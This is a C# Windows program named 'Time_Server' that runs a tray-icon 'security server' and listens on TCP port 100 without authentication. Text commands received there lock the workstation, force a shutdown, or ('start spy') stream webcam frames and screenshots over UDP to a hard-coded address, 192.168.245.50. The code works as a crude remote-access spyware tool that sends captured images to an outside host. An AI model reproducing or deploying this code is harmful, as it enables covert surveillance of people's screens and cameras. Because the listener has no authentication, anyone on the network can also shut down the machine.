using Emgu.CV;
using Emgu.CV.Structure;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Time_Server
{
    class Program
    {
        //for TCP communication
        private static byte[] _buffer = new byte[1024];
        private static List<Socket> _clientSockets = new List<Socket>();
        private static Socket _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        //for UDP communication

        static Capture capture;
        static MemoryStream ms, ms2;
        static Socket sending_socket, screen_socket;
        static IPAddress send_to_address;
        static IPEndPoint sending_end_point;
        static IPEndPoint sending_end_point2;
        static Image<Bgr, Byte> frame;
        static Thread streamerThread;
        static Thread screenStreamerThread;

        static void Main(string[] args)
        {
            //Console.Title = "Server";
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Thread bg = new Thread(new ThreadStart(SetupServer));
            bg.Start();
            using (NotifyIcon icon = new NotifyIcon())
            {
                icon.Icon = System.Drawing.Icon.ExtractAssociatedIcon(Application.ExecutablePath);
                //icon.Icon = new Icon("logo.ico");
                icon.ContextMenu = new ContextMenu(new MenuItem[] {
                new MenuItem("Exit", (s, e) => { Application.Exit(); }),
                });
                icon.Visible = true;
                icon.ShowBalloonTip(10000, "Server Started", "Security Server is Running, CLick exit on the System tray to close", 
                    ToolTipIcon.Info);
                Application.Run();
                
                icon.Visible = false;
            }

            
            //Console.ReadLine();
        }

        private static void SetupServer()
        {
            //Console.WriteLine("Setting up server...");
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, 100));
            _serverSocket.Listen(1);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
            //Process.Start("shutdown", "/s /t 0");
        }

        private static void AcceptCallback(IAsyncResult AR)
        {
            Socket socket = _serverSocket.EndAccept(AR);
            _clientSockets.Add(socket);
            Console.WriteLine("Client Connected");
            socket.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, new AsyncCallback(ReceiveCallback), socket);
            _serverSocket.BeginAccept(new AsyncCallback(AcceptCallback), null);
        }
        [System.Runtime.InteropServices.DllImport("user32")]
        public static extern void LockWorkStation();


        private static void ReceiveCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            int received = socket.EndReceive(AR);

            byte[] dataBuf = new byte[received];

            Array.Copy(_buffer, dataBuf, received);

            string text = Encoding.ASCII.GetString(dataBuf);

            Console.WriteLine("Text received: " + text);

            string response = string.Empty;

            if (text.ToLower() == "lock screen")
            {
                response = "Your Computer Is Locked";
                byte[] data = Encoding.ASCII.GetBytes(response);
                socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                LockWorkStation();
            }
            else if (text.ToLower() == "shut down")
            {
                response = "Your Computer Is Shutted Down";
                byte[] data = Encoding.ASCII.GetBytes(response);
                socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                System.Diagnostics.Process.Start(@"C:\WINDOWS\system32\Shutdown", "-s -f -t 00");
                
            }
            else if (text.ToLower() == "start spy")
            {
                if (capture != null)
                    capture.Dispose();

                if (streamerThread != null && streamerThread.IsAlive)
                {
                    streamerThread.Abort();
                    sending_socket.Close();
                }
                if (screenStreamerThread != null && screenStreamerThread.IsAlive)
                {
                    screenStreamerThread.Abort();
                    screen_socket.Close();
                }

                response = "Live Streaming is Starting";
                byte[] data = Encoding.ASCII.GetBytes(response);
                socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                VideoStream();
                WindowStream();
            }
            else if (text.ToLower() == "stop stream")
            {
                if (capture != null)
                    capture.Dispose();

                if (streamerThread != null && streamerThread.IsAlive)
                {
                    streamerThread.Abort();
                    sending_socket.Close();
                }
                if (screenStreamerThread != null && screenStreamerThread.IsAlive)
                {
                    screenStreamerThread.Abort();
                    screen_socket.Close();
                }
            } 
            else if (text.ToLower() == "video stream")
            {
                response = "Screen Streaming is Starting";
                byte[] data = Encoding.ASCII.GetBytes(response);
                socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                VideoStream();
            }
            else if (text.ToLower() == "screen stream")
            {
                response = "Screen Streaming is Starting";
                byte[] data = Encoding.ASCII.GetBytes(response);
                socket.BeginSend(data, 0, data.Length, SocketFlags.None, new AsyncCallback(SendCallback), socket);
                WindowStream();
            }
    
        }
        private static void SendCallback(IAsyncResult AR)
        {
            Socket socket = (Socket)AR.AsyncState;
            socket.EndSend(AR);
        }

      

      private static void VideoStream()
      {

          sending_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

          send_to_address = IPAddress.Parse("192.168.245.50");

          sending_end_point = new IPEndPoint(send_to_address, 11444);

          sending_socket.Connect(sending_end_point);

          //if (screenStreamerThread != null && screenStreamerThread.IsAlive)
          //    screenStreamerThread.Abort();

          streamerThread = new Thread(new ThreadStart(sendStream));
          streamerThread.Start();


      }

      private static void WindowStream()
      {
          screen_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

          send_to_address = IPAddress.Parse("192.168.245.50");

          sending_end_point2 = new IPEndPoint(send_to_address, 11445);

          screen_socket.Connect(sending_end_point2);

          screenStreamerThread = new Thread(new ThreadStart(sendScreenStream));
          screenStreamerThread.Start();

      }


      static void sendStream()
      {
          try
          {
              capture = new Capture();

              while (sending_socket.Connected)
              {
                  frame = capture.QueryFrame().Resize(0.25, Emgu.CV.CvEnum.INTER.CV_INTER_AREA).Copy();
                  //frame.Save(@"E:\MyPic.jpg");
                  Image a = frame.ToBitmap();
                  ms = new MemoryStream();
                  a.Save(ms, ImageFormat.Bmp);

                  sending_socket.Send(ms.ToArray());
              }
          }
          catch (Exception ex) { }
      }

      private void btnStop_Click(object sender, EventArgs e)
      {
          if (streamerThread != null && streamerThread.IsAlive)
              streamerThread.Abort();

          if (screenStreamerThread != null && screenStreamerThread.IsAlive)
              screenStreamerThread.Abort();

          if (capture != null)
              capture.Dispose();

          
          sending_socket.Close();
      }

      //private void btnScreen_Click(object sender, EventArgs e)
      //{
      //    sending_socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

      //    send_to_address = IPAddress.Parse("192.168.142.52");

      //    sending_end_point = new IPEndPoint(send_to_address, 11444);

      //    sending_socket.Connect(sending_end_point);

      //    if (streamerThread != null && streamerThread.IsAlive)
      //        streamerThread.Abort();

      //    if (capture != null)
      //        capture.Dispose();

      //    screenStreamerThread = new Thread(new ThreadStart(sendScreenStream));
      //    screenStreamerThread.Start();

      //}

      static void sendScreenStream()
      {
          try
          {
              while (screen_socket.Connected)
              {


                  //Create a new bitmap.
                  var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                                 Screen.PrimaryScreen.Bounds.Height,
                                                 PixelFormat.Format32bppArgb);

                  // Create a graphics object from the bitmap.
                  var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

                  // Take the screenshot from the upper left corner to the right bottom corner.
                  gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                              Screen.PrimaryScreen.Bounds.Y,
                                              0,
                                              0,
                                              Screen.PrimaryScreen.Bounds.Size,
                                              CopyPixelOperation.SourceCopy);

                  Size size = new Size(150, 100);

                  Bitmap b = new Bitmap(size.Width, size.Height);
                  using (Graphics g = Graphics.FromImage((Image)b))
                  {
                      g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                      g.DrawImage(bmpScreenshot, 0, 0, size.Width, size.Height);
                  }

                  ms2 = new MemoryStream();
                  b.Save(ms2, ImageFormat.Bmp);

                  screen_socket.Send(ms2.ToArray());
              }
          }
          catch (Exception ex) { }
      }

    }
}
